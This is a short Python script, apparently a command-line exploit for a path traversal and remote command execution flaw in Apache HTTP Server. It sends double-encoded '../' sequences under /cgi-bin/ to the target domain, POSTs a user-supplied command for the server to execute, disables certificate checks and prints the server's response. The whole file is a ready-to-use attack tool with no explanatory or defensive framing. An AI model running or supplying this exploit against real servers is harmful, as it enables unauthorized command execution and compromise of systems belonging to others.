import requests
import argparse


class ApacheExploit:
    def __init__(self, domain, path, command):
        self.domain = domain
        self.path = path
        self.command = command

    def exploit(self):
        url = self.domain + "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/" + self.path

        headers = {
            'Content-Type': 'text/plain',
        }

        payload = self.command

        try:
            response = requests.post(url, headers=headers, data=payload, verify=False)
            print(f"Target: {self.domain}")
            print("Response:")
            print(response.text)
            print("--------")
        except requests.exceptions.RequestException as e:
            print(f"Failed to connect to the target: {self.domain}")
            print(f"Error: {e}")
            print("--------")


def main():
    parser = argparse.ArgumentParser(description="Apache HTTP Server Exploit")
    parser.add_argument("--domain", "-d", help="Domain to exploit")
    parser.add_argument("--path", "-p", help="Path or command to exploit")
    parser.add_argument("--command", "-c", help="Command to execute")
    args = parser.parse_args()

    exploit = ApacheExploit(args.domain, args.path, args.command)
    exploit.exploit()


if __name__ == "__main__":
    main()
